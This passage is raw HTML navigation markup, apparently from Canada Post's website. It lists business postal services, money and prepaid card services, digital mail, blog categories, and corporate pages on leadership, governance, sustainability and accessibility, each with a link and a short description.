          <p>Create shipping labels online and access discounted rates.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services.page?" class="parent-link" target="" alt="">Postal services</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services.page?" target="" alt="">
              <h3 class="submenu-header">Postal services<span class="open-new-window"></span></h3>
                <p>Learn about mailing services to support your business operations.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing.page?" class="menu-title parent-link" target="" alt="">Mailing</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing.page?" target="" alt="">
          <h3 class="submenu-header">Mailing<span class="open-new-window"></span></h3>
          <p>Learn about services to manage your business mailings.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/letter-discounts.page?" class="" target="" alt="">Get business letter discounts</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/letter-discounts.page?" target="" alt="">
        <h3 class="submenu-header">Get business letter discounts<span class="open-new-window"></span></h3>
        <p>Learn about savings on large-volume business correspondence mail. </p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/send-publications.page?" class="" target="" alt="">Send publications</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/send-publications.page?" target="" alt="">
        <h3 class="submenu-header">Send publications<span class="open-new-window"></span></h3>
        <p>Access lower postage rates on magazines, newspapers and newsletters.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/prepaid-reply-mail.page?" class="parent-link" target="" alt="">Prepaid reply mail</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/prepaid-reply-mail.page?" target="" alt="">
        <h3 class="submenu-header">Prepaid reply mail<span class="open-new-window"></span></h3>
        <p>Include postage-paid return mail as part of direct mail campaigns.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/prepaid-reply-mail/design-track.page?" class="" target="" alt="">Design and track reply mail</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/prepaid-reply-mail/design-track.page?" target="" alt="">
            <h3 class="submenu-header">Design and track reply mail<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/mail-forwarding.page?" class="" target="" alt="">Forward your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/mail-forwarding.page?" target="" alt="">
        <h3 class="submenu-header">Forward your mail<span class="open-new-window"></span></h3>
        <p>Forward mail to a new or temporary address.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/hold-mail.page?" class="" target="" alt="">Hold your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/hold-mail.page?" target="" alt="">
        <h3 class="submenu-header">Hold your mail<span class="open-new-window"></span></h3>
        <p>Temporarily stop mail delivery to your address.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/register.page?" class="" target="" alt="">Register your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/mailing/register.page?" target="" alt="">
        <h3 class="submenu-header">Register your mail<span class="open-new-window"></span></h3>
        <p>Pay a flat rate for Registered Mail™ and get a signature upon arrival.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/money-prepaid-cards.page?" class="menu-title parent-link" target="" alt="">Money services and prepaid cards</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/money-prepaid-cards.page?" target="" alt="">
          <h3 class="submenu-header">Money services and prepaid cards<span class="open-new-window"></span></h3>
          <p>Learn about worldwide money transfers and buying secure, prepaid cards.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/money-prepaid-cards/money-orders.page?" class="" target="" alt="">Money orders</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/money-prepaid-cards/money-orders.page?" target="" alt="">
        <h3 class="submenu-header">Money orders<span class="open-new-window"></span></h3>
        <p>Send certified cashable documents securely through the mail.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/money-prepaid-cards/credit-cards.page?" class="" target="" alt="">Prepaid credit cards</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/money-prepaid-cards/credit-cards.page?" target="" alt="">
        <h3 class="submenu-header">Prepaid credit cards<span class="open-new-window"></span></h3>
        <p>Buy prepaid cards at the post office for shopping and travel.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/money-prepaid-cards/mobile-top-ups-prepaid-products.page?" class="" target="" alt="">Gift cards and prepaid products</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/money-prepaid-cards/mobile-top-ups-prepaid-products.page?" target="" alt="">
        <h3 class="submenu-header">Gift cards and prepaid products<span class="open-new-window"></span></h3>
        <p>Buy gift cards and phone vouchers at the post office. </p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice" class="menu-title " target="" alt="">Find a post office</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice" target="" alt="">
          <h3 class="submenu-header">Find a post office<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/rent-postal-box.page?" class="menu-title " target="" alt="">Rent a post office box</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/rent-postal-box.page?" target="" alt="">
          <h3 class="submenu-header">Rent a post office box<span class="open-new-window"></span></h3>
          <p>Get your business mail delivered to a secure Postal Box.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/digital-mail.page?" class="menu-title parent-link" target="" alt="">Digital mail and document sharing</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/digital-mail.page?" target="" alt="">
          <h3 class="submenu-header">Digital mail and document sharing<span class="open-new-window"></span></h3>
          <p>Send pay statements and tax forms or large files to employees securely.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/digital-mail/epost-connect.page?" class="" target="" alt="">Share confidential files digitally (Connect)</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/digital-mail/epost-connect.page?" target="" alt="">
        <h3 class="submenu-header">Share confidential files digitally (Connect)<span class="open-new-window"></span></h3>
        <p>Securely send messages and documents outside your corporate firewall.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/digital-mail/epost.page?" class="" target="" alt="">Send digital mail securely</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/digital-mail/epost.page?" target="" alt="">
        <h3 class="submenu-header">Send digital mail securely<span class="open-new-window"></span></h3>
        <p>Send customers and employees bills and statements to a secure inbox.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/digital-proof-identity.page?" class="menu-title " target="" alt="">Verify customer identity</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/digital-proof-identity.page?" target="" alt="">
          <h3 class="submenu-header">Verify customer identity<span class="open-new-window"></span></h3>
          <p>Setup Digital Proof of Identity to protect against fraud and theft.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/stamps-meters.page?" class="menu-title " target="" alt="">Purchase stamps and meters</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/stamps-meters.page?" target="" alt="">
          <h3 class="submenu-header">Purchase stamps and meters<span class="open-new-window"></span></h3>
          <p>Choose your postage and save on frequent or large business mailing.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/store-boutique/en/home" class="menu-title " target="" alt="">Shop</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/store-boutique/en/home" target="" alt="">
          <h3 class="submenu-header">Shop<span class="open-new-window"></span></h3>
          <p>Shop for stamps, shipping supplies and collectibles.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/order-parcel-locker.page?" class="menu-title " target="" alt="">Request a parcel locker</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/order-parcel-locker.page?" target="" alt="">
          <h3 class="submenu-header">Request a parcel locker<span class="open-new-window"></span></h3>
          <p>Get a free parcel locker installed in your building for residents.  </p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/commercial-invoices.page?" class="menu-title " target="" alt="">Billing and Invoices</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/postal-services/commercial-invoices.page?" target="" alt="">
          <h3 class="submenu-header">Billing and Invoices<span class="open-new-window"></span></h3>
          <p>Learn how to build customized invoices for your business.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://www.canadapost-postescanada.ca/blogs/business/" class="parent-link" target="_blank" alt="Opens in new tab">Articles and resources</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/" target="_blank" alt="Opens in new tab">
              <h3 class="submenu-header">Articles and resources<span class="open-new-window"></span></h3>
                <p>Access articles with ideas and tips to support your business operations.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/blogs/business/category/shipping/" class="menu-title parent-link" target="_blank" alt="Opens in new tab">All posts in shipping</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/shipping/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">All posts in shipping<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/blogs/business/category/shipping/shipping-insights" class="" target="_blank" alt="Opens in new tab">Shipping articles</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/shipping/shipping-insights" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">Shipping articles<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/blogs/business/category/shipping/shipping-resources/" class="" target="_blank" alt="Opens in new tab">Shipping resources</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/shipping/shipping-resources/" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">Shipping resources<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/events/featured.page?" class="" target="" alt="">Shipping events</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/events/featured.page?" target="" alt="">
        <h3 class="submenu-header">Shipping events<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/blogs/business/category/marketing/" class="menu-title parent-link" target="_blank" alt="Opens in new tab">All posts in marketing</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/marketing/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">All posts in marketing<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/blogs/business/category/marketing/marketing-insights" class="" target="_blank" alt="Opens in new tab">Marketing articles</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/marketing/marketing-insights" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">Marketing articles<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/blogs/business/category/marketing/marketing-resources" class="" target="_blank" alt="Opens in new tab">Marketing resources</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/marketing/marketing-resources" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">Marketing resources<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/events/marketing.page?" class="" target="" alt="">Marketing events</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/events/marketing.page?" target="" alt="">
        <h3 class="submenu-header">Marketing events<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/blogs/business/category/ecommerce/" class="menu-title parent-link" target="_blank" alt="Opens in new tab">All posts in e-commerce</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/ecommerce/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">All posts in e-commerce<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/blogs/business/category/ecommerce/ecommerce-insights" class="" target="_blank" alt="Opens in new tab">E-commerce articles</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/ecommerce/ecommerce-insights" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">E-commerce articles<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/blogs/business/category/ecommerce/ecommerce-resources" class="" target="_blank" alt="Opens in new tab">E-commerce resources</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/blogs/business/category/ecommerce/ecommerce-resources" target="_blank" alt="Opens in new tab">
        <h3 class="submenu-header">E-commerce resources<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/events/ecommerce.page?" class="" target="" alt="">E-commerce events</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/marketing/events/ecommerce.page?" target="" alt="">
        <h3 class="submenu-header">E-commerce events<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
       
        </ul>
        <ul id="mobile-nav-section-our-company" class="menu-primary-links " data-sitemap="our-company">
           
      <div class="menu-overview">
      <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company.page?" target="">
      <h3 class="submenu-header">Our Company<span class="open-new-window"></span></h3>
      <p>Learn about Canada Post and shipping service alerts.</p>
      </a>
      </div> 
      
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us.page?" class="parent-link" target="" alt="">About us</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us.page?" target="" alt="">
              <h3 class="submenu-header">About us<span class="open-new-window"></span></h3>
                <p>Learn about our management team and corporate initiatives.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership.page?" class="menu-title parent-link" target="" alt="">Our leadership</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership.page?" target="" alt="">
          <h3 class="submenu-header">Our leadership<span class="open-new-window"></span></h3>
          <p>Learn about our leadership behaviours and teams.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/senior-management-team.page?" class="" target="" alt="">Senior management team</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/senior-management-team.page?" target="" alt="">
        <h3 class="submenu-header">Senior management team<span class="open-new-window"></span></h3>
        <p>Learn about the members of our senior management team.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance.page?" class="parent-link" target="" alt="">Corporate governance</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance.page?" target="" alt="">
        <h3 class="submenu-header">Corporate governance<span class="open-new-window"></span></h3>
        <p>Learn about the Board of Directors, our principles and policies.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance/role-of-the-board.page?" class="" target="" alt="">Role of the Board</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance/role-of-the-board.page?" target="" alt="">
            <h3 class="submenu-header">Role of the Board<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-biographies.page?" class="" target="" alt="">Directors' biographies</a>
                                   <div class="menu-hide level4">
                                  <div class="menu-overview">
                                    <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-biographies.page?" target="" alt="">
                                      <h3 class="submenu-header">Directors' biographies<span class="open-new-window"></span>
                                      </h3>
                                      <p></p>
                                    </a>
                                  </div>
                                  <ul>

                                  </ul>
                      </div>
                      </li>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-committees.page?" class="" target="" alt="">Directors' committees</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance/directors-committees.page?" target="" alt="">
                              <h3 class="submenu-header">Directors' committees<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance/diversity-on-our-board.page?" class="" target="" alt="">Board diversity</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/corporate-governance/diversity-on-our-board.page?" target="" alt="">
                              <h3 class="submenu-header">Board diversity<span class="open-new-window"></span>
                              </h3>
                              <p></p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                      </ul>
                  </div>
                  </li>

                  <li>
                    <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy.page?" class="parent-link" target="" alt="">Travel and hospitality policy</a>
                    <div class="menu-item-level level4" data-level="4">
                      <div class="menu-overview">
                        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy.page?" target="" alt="">
                          <h3 class="submenu-header">Travel and hospitality policy<span class="open-new-window"></span>
                          </h3>
                          <p>Learn about the Board and senior management members spending policy.</p>
                        </a>
                      </div>
                      <ul>

                        <li>
                          <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy/travel-and-hospitality-expenses.page?" class="" target="" alt="">Travel and hospitality expenses</a>
                          <div class="menu-hide level4">
                            <div class="menu-overview">
                              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/our-leadership/travel-and-hospitality-policy/travel-and-hospitality-expenses.page?" target="" alt="">
                                <h3 class="submenu-header">Travel and hospitality expenses<span class="open-new-window"></span>
                                </h3>
                                <p></p>
                              </a>
                            </div>
                            <ul>

                            </ul>
                          </div>
                        </li>

                      </ul>
                    </div>
                  </li>

                  </ul>
                </div>

                </li>



                <li>
                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-sustainability.page?" class="menu-title parent-link" target="" alt="">Corporate sustainability</a>
                  <div class="menu-item-level level1" data-level="3">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-sustainability.page?" target="" alt="">
                        <h3 class="submenu-header">Corporate sustainability<span class="open-new-window"></span>
                        </h3>
                        <p>Learn about how we support communities, employees and the environment.</p>
                      </a>
                    </div>
                    <ul>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-sustainability/environment-responsibility.page?" class="" target="" alt="">Environmental responsibility</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-sustainability/environment-responsibility.page?" target="" alt="">
                              <h3 class="submenu-header">Environmental responsibility<span class="open-new-window"></span>
                              </h3>
                              <p>Learn about our sustainability and conservation efforts.</p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility.page?" class="parent-link" target="" alt="">Accessibility</a>
                        <div class="menu-item-level level4" data-level="4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility.page?" target="" alt="">
                              <h3 class="submenu-header">Accessibility<span class="open-new-window"></span>
                              </h3>
                              <p>Learn about how we’re improving the accessibility of our services.</p>
                            </a>
                          </div>
                          <ul>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility/digital-accessibility.page?" class="" target="" alt="">Digital accessibility</a>
                              <div class="menu-hide level4">
                                <div class="menu-overview">
                                  <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility/digital-accessibility.page?" target="" alt="">
                                    <h3 class="submenu-header">Digital accessibility<span class="open-new-window"></span>
                                    </h3>
                                    <p></p>
                                  </a>
                                </div>
                                <ul>

                                </ul>
                              </div>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility/delivery-accommodation-program.page?" class="" target="" alt="">Delivery accommodation program</a>
                              <div class="menu-hide level4">
                                <div class="menu-overview">
                                  <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility/delivery-accommodation-program.page?" target="" alt="">
                                    <h3 class="submenu-header">Delivery accommodation program<span class="open-new-window"></span>
                                    </h3>
                                    <p></p>
                                  </a>
                                </div>
                                <ul>

                                </ul>
                              </div>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility/advisory-panel.page?" class="" target="" alt="">Accessibility advisory panel</a>
                              <div class="menu-hide level4">
                                <div class="menu-overview">
                                  <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility/advisory-panel.page?" target="" alt="">
                                    <h3 class="submenu-header">Accessibility advisory panel<span class="open-new-window"></span>
                                    </h3>
                                    <p></p>
                                  </a>
                                </div>
                                <ul>

                                </ul>
                              </div>
                            </li>

                          </ul>
                        </div>
                      </li>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/archived-corporate-reports.page?" class="" target="" alt="">Archived corporate reports</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/archived-corporate-reports.page?" target="" alt="">
                              <h3 class="submenu-header">Archived corporate reports<span class="open-new-window"></span>
                              </h3>
                              <p>Access past corporate responsibility reports.</p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                      <li>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-sustainability/indigenous-reconciliation.page?" class="" target="" alt="">Indigenous and Northern reconciliation</a>
                        <div class="menu-hide level4">
                          <div class="menu-overview">
                            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-sustainability/indigenous-reconciliation.page?" target="" alt="">
                              <h3 class="submenu-header">Indigenous and Northern reconciliation<span class="open-new-window"></span>
                              </h3>
                              <p>Learn about how we’re improving our work with Indigenous communities.</p>
                            </a>
                          </div>
                          <ul>

                          </ul>
                        </div>
                      </li>

                    </ul>
                  </div>

                </li>



                <li>
                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust.page?" class="menu-title parent-link" target="" alt="">Transparency and trust</a>
                  <div class="menu-item-level level1" data-level="3">
                    <div class="menu-overview">
                      <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust.page?" target="" alt="">
